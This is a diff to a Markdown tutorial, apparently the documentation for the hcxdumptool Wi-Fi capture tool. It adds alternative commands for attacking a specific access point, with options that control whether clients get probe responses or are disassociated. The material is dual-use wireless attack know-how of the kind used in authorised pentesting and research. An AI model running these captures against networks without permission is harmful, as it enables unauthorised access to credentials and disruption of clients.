@@ -61,10 +61,19 @@ If everything is working as expected, we are going to attack 00c0cab035be ussing
 
 ### Step Two - Running hcxdumptool
 
-Since we have now made the BPF, we can start the attack using all the information mentioned above.
+Since we have now made the BPF, we can start the attack using all the information mentioned above depending on the invasive levewl:
 
 ```
 sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w testap.pcapng
+
+or (do not respond to CLIENTs)
+sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --bpf=attack.bpf -w testap.pcapng
+
+or (do not DISASSOCIATE CLIENTs)
+sudo hcxdumptool -i wlan0 --rds=3 -c 11a --disable_disassociation --bpf=attack.bpf -w testap.pcapng
+
+or (do not respond to CLIENTs and do not DISASSOCIATE CLIENTs)
+sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --disable_disassociation --bpf=attack.bpf -w testap.pcapng
 ```
 
 > [!NOTE]
